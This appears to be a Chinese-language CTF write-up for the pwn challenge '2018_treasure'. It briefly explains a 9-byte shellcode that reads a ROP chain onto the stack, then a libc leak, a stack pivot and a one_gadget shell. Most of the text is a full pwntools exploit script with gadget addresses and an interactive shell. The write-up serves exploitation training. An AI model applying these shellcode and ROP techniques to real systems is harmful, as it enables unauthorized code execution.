[toc]

# 前置知识

- `shellcode`编写
- `mmap`函数
- （可选）栈迁移&`ROP`链

# 整体思路

程序有两个函数，一个叫`settreasure`一个叫`treasure`，第一个函数放置的`shellcode`的地方是不可执行的，因此我这里没管

第二个函数能写`9`字节`shellcode`

这里通过`9`字节`shellcode`来构造一个`read`到`rsp`，然后写`rop`链。

我的`rop`链的思路是泄露`libc`地址，再`read`后面的`rop`链到可读写段并栈迁移过去执行

# exp

```python
from pwn import *
from LibcSearcher import *

filename = './2018_treasure'
context(log_level='debug', arch='amd64')
local = 1
elf = ELF(filename)
libc = ELF('/glibc/2.27-3ubuntu1_amd64/libc.so.6')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, 'b *0x400AB6')
    pause()


def leak_info(name, addr):
    success('{} => {}'.format(name, hex(addr)))

# sh = process(filename)
leak_info('/bin/sh',u64('/bin/sh\x00'))
sh.recv()
sh.sendline('1')
sh.recv()
payload = asm('''push rsp
pop rsi
mov edx, esi
syscall
ret
''')
# debug()
sh.send(payload)
# pause()
pop_rdi = 0x400b83
pop_rsi_r15 = 0x400b81
fake_rbp = 0x601200
leave_ret = 0x4009b8
pop_rbp = 0x400800
payload = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(fake_rbp) + p64(0xdeadbeaf) + p64(elf.plt['read']) + p64(pop_rbp) + p64(fake_rbp) + p64(leave_ret)
sh.send(payload)
# pause()
puts_leak = u64((sh.recv(6).ljust(8, b'\x00')))
leak_info('puts_leak', puts_leak)
libc.address = puts_leak - 0x809c0
leak_info('libc.address', libc.address)
# debug()
system_addr = libc.sym['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
# payload = p64(0xdeadbeaf) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(0xdeadbeaf)
payload = p64(0xdeadbeaf) + p64(libc.address + one_gadget[1])
sh.send(payload)
sh.interactive()
# pause()
# pause()
# sh.recv()
```

